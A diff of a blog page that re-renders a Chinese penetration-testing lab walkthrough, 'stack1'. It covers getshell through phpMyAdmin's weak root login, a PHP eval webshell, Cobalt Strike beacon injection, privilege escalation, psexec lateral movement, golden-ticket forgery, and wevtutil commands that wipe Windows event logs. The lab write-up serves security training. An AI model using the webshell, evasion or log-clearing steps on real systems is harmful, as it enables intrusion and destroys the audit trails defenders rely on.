@@ -52,223 +52,136 @@
     <h1>stack1</h1>
     <div class="post-meta">
       <time datetime="2026-04-13T15:05:30.000Z">2026.04.13</time>
-      <span>14 分钟阅读</span>
+      <span>4 分钟阅读</span>
     </div>
   </header>
   <div class="article-content">
-    
-# stack1
-
-靶场密码为123.com
-
-## 1.网络结构
-
-| 主机       | IP                          | 网卡             |
-| ---------- | --------------------------- | ---------------- |
-| Kali Linux | 192.168.243.*               | NAT              |
-| Windows7   | 192.168.243.\*/192.168.52.* | NAT/VMnet2       |
-| Win2k3     | 192.168.52.138              | VMnet2（仅主机） |
-| Win2k8     | 192.168.52.141              | Vmnet2（仅主机） |
-
-Windows7的内网网卡首选DNS服务器设为域控的IP192.168.52.138
-
-![image-20260209141846399](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260209141846399.png)
-
-## 2.外网打点
-
-arp-scan扫描网段，找到主机IP192.168.243.162
-
-![image-20260209142009951](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260209142009951.png)
-
-nmap扫描主机
-
-![image-20260209142149981](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260209142149981.png)
-
-发现开放80，3306，139和445端口，因此可以从Web网页，MySQL数据库，SMB服务三个方面入手
-
-访问网页显示为PHPstudy探针
-
-![image-20260209142402498](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260209142402498.png)
-
-扫描目录，发现一些敏感文件
-
-![image-20260209142502305](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260209142502305.png)
-
-### 2.1通过MySQL数据库
-
-访问/phpmyadmin/README  查看PHPmyadmin版本
-
-![image-20260209142813756](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260209142813756.png)
-
-访问phpmyadmin，尝试使用弱密码登录u-root，p-root
-
-![image-20260209143101216](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260209143101216.png)
-
-点击SQL执行命令
-
-![image-20260410152552434](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410152552434.png)
-
-1.查看general_log配置
-
+    <h1 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h1><p>靶场密码为123.com</p>
+<h2 id="1-网络结构"><a href="#1-网络结构" class="headerlink" title="1.网络结构"></a>1.网络结构</h2><table>
+<thead>
+<tr>
+<th>主机</th>
+<th>IP</th>
+<th>网卡</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Kali Linux</td>
+<td>192.168.243.*</td>
+<td>NAT</td>
+</tr>
+<tr>
+<td>Windows7</td>
+<td>192.168.243.*&#x2F;192.168.52.*</td>
+<td>NAT&#x2F;VMnet2</td>
+</tr>
+<tr>
+<td>Win2k3</td>
+<td>192.168.52.138</td>
+<td>VMnet2（仅主机）</td>
+</tr>
+<tr>
+<td>Win2k8</td>
+<td>192.168.52.141</td>
+<td>Vmnet2（仅主机）</td>
+</tr>
+</tbody></table>
+<p>Windows7的内网网卡首选DNS服务器设为域控的IP192.168.52.138</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260209141846399.png" alt="image-20260209141846399"></p>
+<h2 id="2-外网打点"><a href="#2-外网打点" class="headerlink" title="2.外网打点"></a>2.外网打点</h2><p>arp-scan扫描网段，找到主机IP192.168.243.162</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260209142009951.png" alt="image-20260209142009951"></p>
+<p>nmap扫描主机</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260209142149981.png" alt="image-20260209142149981"></p>
+<p>发现开放80，3306，139和445端口，因此可以从Web网页，MySQL数据库，SMB服务三个方面入手</p>
+<p>访问网页显示为PHPstudy探针</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260209142402498.png" alt="image-20260209142402498"></p>
+<p>扫描目录，发现一些敏感文件</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260209142502305.png" alt="image-20260209142502305"></p>
+<h3 id="2-1通过MySQL数据库"><a href="#2-1通过MySQL数据库" class="headerlink" title="2.1通过MySQL数据库"></a>2.1通过MySQL数据库</h3><p>访问&#x2F;phpmyadmin&#x2F;README  查看PHPmyadmin版本</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260209142813756.png" alt="image-20260209142813756"></p>
+<p>访问phpmyadmin，尝试使用弱密码登录u-root，p-root</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260209143101216.png" alt="image-20260209143101216"></p>
+<p>点击SQL执行命令</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410152552434.png" alt="image-20260410152552434"></p>
+<p>1.查看general_log配置</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-![image-20260410173731329](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410173731329.png)
-
-2.打开日志功能
-
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410173731329.png" alt="image-20260410173731329"></p>
+<p>2.打开日志功能</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span>&quot;On&quot;</span><br></pre></td></tr></table></figure>
 
-3.将日志文件位置改为www目录下
-
+<p>3.将日志文件位置改为www目录下</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span>&quot;C:\\phpStudy\\WWW\\shell.php&quot;</span><br></pre></td></tr></table></figure>
 
-4.再次查看general_log配置
-
-![image-20260410175112438](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410175112438.png)
-
-5.写入shell
-
+<p>4.再次查看general_log配置</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410175112438.png" alt="image-20260410175112438"></p>
+<p>5.写入shell</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;shell&#x27;]) ;?&gt;&quot;;</span><br></pre></td></tr></table></figure>
 
-![image-20260410191932163](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410191932163.png)
-
-6.使用蚁剑进行连接
-
-![image-20260410192116525](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410192116525.png)
-
-成功掌握了外网服务器
-
-![image-20260410192325137](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410192325137.png)
-
-## 3.内网攻击
-
-### 3.1cs+蚁剑   
-
-先关闭Windows防火墙
-
-![image-20260412143110734](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412143110734.png)
-
-打开Cobalt Strike，建立一个监听器
-
-![image-20260410220902730](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410220902730.png)
-
-点击add
-
-![image-20260410221258020](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410221258020.png)
-
-配置好参数，HTTP Hosets填cs服务端的IP，点击save
-
-![image-20260410221213554](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410221213554.png)
-
-生成可执行程序
-
-![image-20260410221504805](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410221504805.png)
-
-通过蚁剑上传到拿到webshell的服务器上
-
-![image-20260410221549594](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410221549594.png)
-
-在虚拟终端中执行程序
-
-![image-20260410221640664](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410221640664.png)
-
-靶机已经成功上线
-
-![image-20260410221731089](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410221731089.png)
-
-为防止程序被删除，可以把这个程序迁移到别的系统程序上,先输入ps来查看每个程序的pid
-
-![image-20260410230559159](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410230559159.png)
-
-使用inject [pid] <x86|x64> [listener]将木马程序注入到资源管理器进程中，发现多了一行会话，表示注入成功
-
-![image-20260410235137701](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410235137701.png)
-
-使用kill [pid]删除之前的木马进程，防止被检测到
-
-![image-20260410235516428](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410235516428.png)
-
-## 4.信息收集
-
-使用getuid查看用户权限
-
-![image-20260412112037540](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412112037540.png)
-
-发现不是system权限，使用getsystem提升到system权限
-
-![image-20260412130250343](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412130250343.png)
-
-使用shell ipconfig查看网络适配器
-
-![image-20260413141048475](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413141048475.png)
-
-内网网段是52
-
-使用shell net user查看本地用户
-
-![image-20260413141250566](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413141250566.png)
-
-使用net view查看局域网内其他主机名
-
-![image-20260413145334256](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413145334256.png)
-
-拿到域控及各个主机的IP
-
-使用shell net config Workstation查看计算机名，域，登录域等信息
-
-![image-20260413144306083](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413144306083.png)
-
-使用shell net view/ domain查看有几个域
-
-![image-20260412141023211](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412141023211.png)
-
-只有一个域GOD
-
-尝试抓取明文密码
-
-![image-20260413151903504](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413151903504.png)
-
-## 5.横向移动
-
-对内网主机进行端口扫描
-
-![image-20260412150313211](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412150313211.png)
-
-![image-20260412150423230](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412150423230.png)
-
-![image-20260413152121064](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413152121064.png)
-
-发现开放445端口，可以建立SMB监听隧道
-
-![image-20260412150913235](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412150913235.png)
-
-切换攻击目标为OWA
-
-![image-20260412151640975](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412151640975.png)
-
-使用psexec横向移动
-
-![image-20260412151710628](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412151710628.png)
-
-监听器选择SMB监听器，会话选择SYSTEM权限
-
-![image-20260413155441987](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413155441987.png)
-
-成功拿到域控，并关闭防火墙
-
-![image-20260413155600304](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413155600304.png)
-
-## 6.黄金票据
-
-通过域名，域SID，krbtgt 账户的Hash来生成黄金票据
-
-![image-20260413164159425](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413164159425.png)
-
-![image-20260413160646900](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413160646900.png)
-
-## 7.痕迹清理
-
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell wevtutil cl security    //清理安全日志</span><br><span class="line">shell wevtutil cl system        //清理系统日志</span><br><span class="line">shell wevtutil cl application        //清理应用程序日志</span><br><span class="line">shell wevtutil cl &quot;windows powershell&quot;    //清除power shell日志</span><br><span class="line">shell wevtutil cl Setup     //清除（cl）事件日志中的 &quot;Setup&quot; 事件。</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410191932163.png" alt="image-20260410191932163"></p>
+<p>6.使用蚁剑进行连接</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410192116525.png" alt="image-20260410192116525"></p>
+<p>成功掌握了外网服务器</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410192325137.png" alt="image-20260410192325137"></p>
+<h2 id="3-内网攻击"><a href="#3-内网攻击" class="headerlink" title="3.内网攻击"></a>3.内网攻击</h2><h3 id="3-1cs-蚁剑"><a href="#3-1cs-蚁剑" class="headerlink" title="3.1cs+蚁剑"></a>3.1cs+蚁剑</h3><p>先关闭Windows防火墙</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412143110734.png" alt="image-20260412143110734"></p>
+<p>打开Cobalt Strike，建立一个监听器</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410220902730.png" alt="image-20260410220902730"></p>
+<p>点击add</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410221258020.png" alt="image-20260410221258020"></p>
+<p>配置好参数，HTTP Hosets填cs服务端的IP，点击save</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410221213554.png" alt="image-20260410221213554"></p>
+<p>生成可执行程序</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410221504805.png" alt="image-20260410221504805"></p>
+<p>通过蚁剑上传到拿到webshell的服务器上</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410221549594.png" alt="image-20260410221549594"></p>
+<p>在虚拟终端中执行程序</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410221640664.png" alt="image-20260410221640664"></p>
+<p>靶机已经成功上线</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410221731089.png" alt="image-20260410221731089"></p>
+<p>为防止程序被删除，可以把这个程序迁移到别的系统程序上,先输入ps来查看每个程序的pid</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410230559159.png" alt="image-20260410230559159"></p>
+<p>使用inject [pid] &lt;x86|x64&gt; [listener]将木马程序注入到资源管理器进程中，发现多了一行会话，表示注入成功</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410235137701.png" alt="image-20260410235137701"></p>
+<p>使用kill [pid]删除之前的木马进程，防止被检测到</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260410235516428.png" alt="image-20260410235516428"></p>
+<h2 id="4-信息收集"><a href="#4-信息收集" class="headerlink" title="4.信息收集"></a>4.信息收集</h2><p>使用getuid查看用户权限</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412112037540.png" alt="image-20260412112037540"></p>
+<p>发现不是system权限，使用getsystem提升到system权限</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412130250343.png" alt="image-20260412130250343"></p>
+<p>使用shell ipconfig查看网络适配器</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413141048475.png" alt="image-20260413141048475"></p>
+<p>内网网段是52</p>
+<p>使用shell net user查看本地用户</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413141250566.png" alt="image-20260413141250566"></p>
+<p>使用net view查看局域网内其他主机名</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413145334256.png" alt="image-20260413145334256"></p>
+<p>拿到域控及各个主机的IP</p>
+<p>使用shell net config Workstation查看计算机名，域，登录域等信息</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413144306083.png" alt="image-20260413144306083"></p>
+<p>使用shell net view&#x2F; domain查看有几个域</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412141023211.png" alt="image-20260412141023211"></p>
+<p>只有一个域GOD</p>
+<p>尝试抓取明文密码</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413151903504.png" alt="image-20260413151903504"></p>
+<h2 id="5-横向移动"><a href="#5-横向移动" class="headerlink" title="5.横向移动"></a>5.横向移动</h2><p>对内网主机进行端口扫描</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412150313211.png" alt="image-20260412150313211"></p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412150423230.png" alt="image-20260412150423230"></p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413152121064.png" alt="image-20260413152121064"></p>
+<p>发现开放445端口，可以建立SMB监听隧道</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412150913235.png" alt="image-20260412150913235"></p>
+<p>切换攻击目标为OWA</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412151640975.png" alt="image-20260412151640975"></p>
+<p>使用psexec横向移动</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260412151710628.png" alt="image-20260412151710628"></p>
+<p>监听器选择SMB监听器，会话选择SYSTEM权限</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413155441987.png" alt="image-20260413155441987"></p>
+<p>成功拿到域控，并关闭防火墙</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413155600304.png" alt="image-20260413155600304"></p>
+<h2 id="6-黄金票据"><a href="#6-黄金票据" class="headerlink" title="6.黄金票据"></a>6.黄金票据</h2><p>通过域名，域SID，krbtgt 账户的Hash来生成黄金票据</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413164159425.png" alt="image-20260413164159425"></p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260413160646900.png" alt="image-20260413160646900"></p>
+<h2 id="7-痕迹清理"><a href="#7-痕迹清理" class="headerlink" title="7.痕迹清理"></a>7.痕迹清理</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell wevtutil cl security    //清理安全日志</span><br><span class="line">shell wevtutil cl system        //清理系统日志</span><br><span class="line">shell wevtutil cl application        //清理应用程序日志</span><br><span class="line">shell wevtutil cl &quot;windows powershell&quot;    //清除power shell日志</span><br><span class="line">shell wevtutil cl Setup     //清除（cl）事件日志中的 &quot;Setup&quot; 事件。</span><br></pre></td></tr></table></figure>
 
 
 
